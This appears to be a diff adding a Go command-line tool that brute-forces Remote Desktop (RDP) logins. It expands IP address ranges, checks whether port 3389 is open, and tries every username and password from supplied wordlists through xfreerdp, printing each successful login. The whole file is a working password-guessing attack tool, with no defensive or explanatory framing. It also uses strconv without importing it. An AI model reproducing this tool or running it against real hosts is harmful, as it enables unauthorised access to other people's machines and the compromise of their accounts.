@@ -1,0 +1,150 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+)
+
+func checkRDP(username, password, host string) bool {
+	cmd := exec.Command("xfreerdp", fmt.Sprintf("/u:%s", username), fmt.Sprintf("/p:%s", password), fmt.Sprintf("/v:%s", host))
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+
+	err := cmd.Run()
+
+	if err != nil {
+		fmt.Printf("Failed on %s with %s/%s: %s\n", host, username, password, out.String())
+		return false
+	}
+
+	fmt.Printf("Success on %s with %s/%s\n", host, username, password)
+	return true
+}
+
+func isPortOpen(host string, port string, timeout time.Duration) bool {
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
+	if err != nil {
+		return false
+	}
+	if conn != nil {
+		defer conn.Close()
+		return true
+	}
+	return false
+}
+func expandHostRange(hostRange string) ([]string, error) {
+	var expandedHosts []string
+	parts := strings.Split(hostRange, "-")
+
+	if len(parts) == 1 {
+		// Single host, not a range
+		return []string{hostRange}, nil
+	} else if len(parts) == 2 {
+		// It's a range
+		baseParts := strings.Split(parts[0], ".")
+		if len(baseParts) != 4 {
+			return nil, fmt.Errorf("invalid IP address format")
+		}
+
+		start, err := strconv.Atoi(baseParts[3])
+		if err != nil {
+			return nil, err
+		}
+
+		end, err := strconv.Atoi(parts[1])
+		if err != nil {
+			return nil, err
+		}
+
+		for i := start; i <= end; i++ {
+			host := fmt.Sprintf("%s.%s.%s.%d", baseParts[0], baseParts[1], baseParts[2], i)
+			expandedHosts = append(expandedHosts, host)
+		}
+
+		return expandedHosts, nil
+	} else {
+		return nil, fmt.Errorf("invalid range format")
+	}
+}
+
+func main() {
+    var singleUsername, singlePassword string
+    flag.StringVar(&singleUsername, "u", "", "Single username")
+    flag.StringVar(&singlePassword, "p", "", "Single password")
+
+    usernameFile := flag.String("uf", "", "Username file")
+    passwordFile := flag.String("pf", "", "Password file")
+
+    flag.Parse()
+
+    var allHosts []string
+    for _, arg := range flag.Args() {
+        expandedHosts, err := expandHostRange(arg)
+        if err != nil {
+            fmt.Printf("Error expanding host range '%s': %v\n", arg, err)
+            continue
+        }
+        allHosts = append(allHosts, expandedHosts...)
+    }
+
+    var usernames, passwords []string
+    var err error
+
+    if *usernameFile != "" {
+        usernames, err = readLines(*usernameFile)
+        if err != nil {
+            fmt.Printf("Error reading username file: %v\n", err)
+            return
+        }
+    } else {
+        usernames = []string{singleUsername}
+    }
+
+    if *passwordFile != "" {
+        passwords, err = readLines(*passwordFile)
+        if err != nil {
+            fmt.Printf("Error reading password file: %v\n", err)
+            return
+        }
+    } else {
+        passwords = []string{singlePassword}
+    }
+
+    for _, host := range allHosts {
+        if !isPortOpen(host, "3389", 5*time.Second) {
+            fmt.Printf("RDP port is closed on %s, skipping.\n", host)
+            continue
+        }
+
+        for _, username := range usernames {
+            for _, password := range passwords {
+                if checkRDP(username, password, host) {
+                    // Optionally break if you only want the first successful login per host
+                }
+            }
+        }
+    }
+}
+
+func readLines(path string) ([]string, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, strings.TrimSpace(scanner.Text()))
+	}
+	return lines, scanner.Err()
+}
